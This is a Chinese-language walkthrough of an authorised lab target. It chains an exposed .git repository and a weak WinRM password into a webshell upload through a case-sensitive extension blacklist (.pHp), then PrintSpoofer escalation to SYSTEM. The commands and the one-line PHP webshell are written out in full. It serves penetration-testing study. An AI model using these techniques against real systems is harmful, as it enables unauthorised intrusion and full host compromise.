# 11s 靶机复盘：Git 泄露到 PrintSpoofer 提权

> 本文记录的是隔离环境中的授权靶机复盘。口令爆破、WebShell 上传与权限提升均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | 11s / Windows Server 2019 |
| 主机名 | WIN-CO8A2CNP250 |
| 目标地址 | 192.168.135.134 |
| 攻击机 | 192.168.135.128 |
| Web 栈 | IIS 10.0 + PHP 5.6.9（80）、Apache 2.4.39（8080） |
| 开放端口 | 80、135、139、445、5985、8080 等 |
| 最终路径 | `.git` 泄露 → 用户名与弱口令线索 → WinRM → 上传黑名单大小写绕过 → AppPool WebShell → PrintSpoofer → SYSTEM |

![主机发现：定位靶机地址](/content/11s/image-01.png)

## 1. 攻击链概览

这台靶机的前半段是信息泄露与默认口令，后半段才是真正的提权设计：普通用户 `kaada` 权限很薄，但 IIS 应用池账户带有 `SeImpersonatePrivilege`。因此需要先借 Web 上传点切到 AppPool 身份，再做土豆类提权。

```text
主机发现 / 端口扫描
  → 8080 .git 泄露并还原仓库
  → 提交信息暴露 kaada + 默认口令 TODO
  → WinRM 爆破得到 kaada / Password1
  → Evil-WinRM 拿 user flag
  → 审计 upload.php 扩展名黑名单
  → .pHp 大小写绕过上传 WebShell
  → IIS AppPool\DefaultAppPool + SeImpersonatePrivilege
  → PrintSpoofer
  → NT AUTHORITY\SYSTEM
```

## 2. 枚举：发现目标与关键服务

先做网段存活探测，再对目标做全端口扫描：

```bash
nmap -sn 192.168.135.0/24
sudo arp-scan -l

nmap -sT -sV -sC -O -p- 192.168.135.134
```

目标确认为 `192.168.135.134`。扫描结果里比较关键的端口：

| 端口 | 服务 | 备注 |
|------|------|------|
| 80/tcp | Microsoft HTTPAPI / IIS | 后续上传点所在 |
| 445/tcp | SMB | 匿名访问被拒绝 |
| 5985/tcp | WinRM | 初始 Shell 入口 |
| 8080/tcp | Apache 2.4.39 | nmap 的 `http-git` 直接报出 `.git` |

![全端口扫描：8080 暴露 .git](/content/11s/image-02.png)

顺便验证 445：`smbclient -L //192.168.135.134 -N` 与 `enum4linux` 都无法建立空会话，只能确认主机名 `WIN-CO8A2CNP250` 与工作组 `WORKGROUP`。这条线先放下，优先跟 8080。

![445 匿名枚举失败](/content/11s/image-11.png)

## 3. 利用：从 Git 泄露到 WinRM

### 3.1 确认 `.git` 可访问

目录本身返回 403，但对象文件可以直接读：

```bash
curl http://192.168.135.134:8080/.git/
curl http://192.168.135.134:8080/.git/HEAD
# ref: refs/heads/master
```

![目录 403，但 HEAD 可读](/content/11s/image-03.png) ![目录枚举确认 .git 对象可下载](/content/11s/image-04.png)

用 git-dumper 把仓库拉到本地：

```bash
git-dumper http://192.168.135.134:8080/.git/ energy-git
cd energy-git
```

还原后的提交记录几乎把入口线索写在了脸上：

```text
Author: kaada <kaada@11s.dsz>
Initial website deploy & author: kaada & TODO:change default password before release
```

![还原后的仓库内容](/content/11s/image-05.png) ![git show 暴露作者与 TODO](/content/11s/image-06.png)

![COMMIT 信息中的默认口令提示](/content/11s/image-07.png) ![git log 交叉验证](/content/11s/image-08.png)

这里至少得到三件事：用户名 `kaada`、域线索 `11s.dsz`，以及“默认口令可能没改”的强提示。

### 3.2 WinRM 爆破与 user flag

对 5985 做授权口令验证，成功凭据为：

```text
kaada / Password1
```

![WinRM 爆破成功：kaada / Password1](/content/11s/image-09.png)

用 Evil-WinRM 登录并读取用户桌面 flag：

```bash
evil-winrm -i 192.168.135.134 -u kaada -p 'Password1'
```

```powershell
cd Desktop
cat user.txt
# flag{user-51a7cf02f9dc6b536b2423057b864b3d}
```

![Evil-WinRM 登录并拿到 user flag](/content/11s/image-10.png)

> 风险说明：对 WinRM 做口令测试会产生明显失败日志。这里只在本地靶场验证，且用户名来自仓库提交信息，而不是盲目喷洒。

## 4. 横向：从普通用户切到 IIS AppPool

### 4.1 发现上传点

`kaada` 可以进入 IIS 站点目录。`C:\inetpub\wwwroot` 下存在 `upload.php`、`uploads\`、`index.php` 等文件，`web.config` 也把默认文档指向 PHP。

![发现 IIS 站点与 upload.php](/content/11s/image-12.png) ![web.config 确认 PHP 默认页](/content/11s/image-13.png)

### 4.2 审计上传黑名单

`upload.php` 用扩展名黑名单拦截常见 PHP 后缀：

```php
$blacklist = array('php', 'php3', 'php4', 'php5', 'phtml', 'pht', 'phps');
in_array(pathinfo($name, PATHINFO_EXTENSION), $blacklist, true);
```

第三参 `true` 让比较区分大小写。Windows / IIS 对扩展名大小写不敏感，因此 `.pHp` 这类变体能绕过校验，同时仍被 PHP 解析执行。

![upload.php：大小写敏感的扩展名黑名单](/content/11s/image-14.png)

### 4.3 上传 WebShell 并确认身份

在已拿到的 WinRM 会话里构造小马，经本机回环打到上传接口，再触发执行：

```powershell
$p="$env:TEMP\shell.pHp"
Set-Content -Path $p -Value '<?php system($_GET["x"]); ?>' -Encoding ASCII
curl.exe -s -F "file=@$p;filename=shell.pHp" http://127.0.0.1/upload.php
curl.exe "http://127.0.0.1/uploads/shell.pHp?x=whoami"
# iis apppool\defaultapppool
```

![上传 WebShell 成功](/content/11s/image-15.png) ![确认执行身份为 DefaultAppPool](/content/11s/image-16.png)

此时已经不在 `kaada` 上下文里了。普通用户的权限枚举也印证了这一点：`kaada` 只有很少特权，`systeminfo` 甚至直接拒绝访问，并不具备 `SeImpersonatePrivilege`。

![kaada 权限很薄，不是提权身份](/content/11s/image-17.png)

## 5. 提权：PrintSpoofer 到 SYSTEM

IIS AppPool 账户通常启用 `SeImpersonatePrivilege`。手里已经有 Evil-WinRM，直接把提权工具 upload 上去即可：

```powershell
# 当前目录：C:\Users\kaada\Documents
upload /home/kali/桌面/靶机/111的win靶机11s/PrintSpoofer64.exe
ls
Test-Path .\PrintSpoofer64.exe
# True
```

![Evil-WinRM 上传 PrintSpoofer 并确认文件存在](/content/11s/image-18.png)

再把工具放到 WebShell 能稳定调用的 `uploads` 目录，构造批处理，以 AppPool 身份拉起 PrintSpoofer，让 SYSTEM 写出验证文件：

```powershell
copy .\PrintSpoofer64.exe C:\inetpub\wwwroot\uploads\

@'
C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe -c "cmd /c whoami > C:\inetpub\wwwroot\uploads\system.txt"
'@ | Set-Content -Path C:\Users\kaada\Documents\run.bat -Encoding ASCII
```

```powershell
curl.exe -s "http://127.0.0.1/uploads/shell.pHp?x=cmd%20/c%20C:%5Cinetpub%5Cwwwroot%5Cuploads%5Crun.bat"
curl.exe -s "http://127.0.0.1/uploads/system.txt"
# nt authority\system
```

![PrintSpoofer 验证 SYSTEM](/content/11s/image-19.png)

读取管理员桌面 flag 时，同样让 SYSTEM 把内容落到 uploads，再经 HTTP 取回：

```powershell
@'
C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe -c "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\inetpub\wwwroot\uploads\root.txt"
'@ | Set-Content -Path C:\Users\kaada\Documents\run.bat -Encoding ASCII

curl.exe -s -F "file=@C:\Users\kaada\Documents\run.bat;filename=root.bat" http://127.0.0.1/upload.php
curl.exe -s "http://127.0.0.1/uploads/shell.pHp?x=cmd%20/c%20C:%5Cinetpub%5Cwwwroot%5Cuploads%5Croot.bat"
curl.exe -s "http://127.0.0.1/uploads/root.txt"
# flag{root-58c1c19e8389524ba790c691541cb5b0}
```

![SYSTEM 下读取 root flag](/content/11s/image-20.png)

## 6. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| `.git` 泄露 | 目录 403 不等于安全；用 `git-dumper` 仍可把对象逐个拉回并还原 |
| 提交信息 | Author、TODO、默认口令提示经常比源码本身更值钱 |
| WinRM | 有用户名后，对 5985 做定向口令验证效率远高于盲目喷洒 |
| 上传黑名单 | `in_array(..., true)` 区分大小写，但 Windows 解析 PHP 不区分 |
| 身份切换 | `kaada` 无 SeImpersonate；真正可提权的是 `IIS AppPool\DefaultAppPool` |
| PrintSpoofer | 利用 SeImpersonatePrivilege 创建 SYSTEM 进程，是 IIS/服务账户场景的常见路径 |

## 7. 复盘

11s 的主线并不绕：泄露给用户名，用户名给 WinRM，WinRM 给源码审计入口，源码审计给 AppPool，AppPool 再给 SYSTEM。值得单独记住的是中间那次身份切换——拿到普通用户 Shell 之后，不要默认“继续在当前会话里找提权”，先问自己：有没有一条路能切到带模拟令牌权限的服务账户。
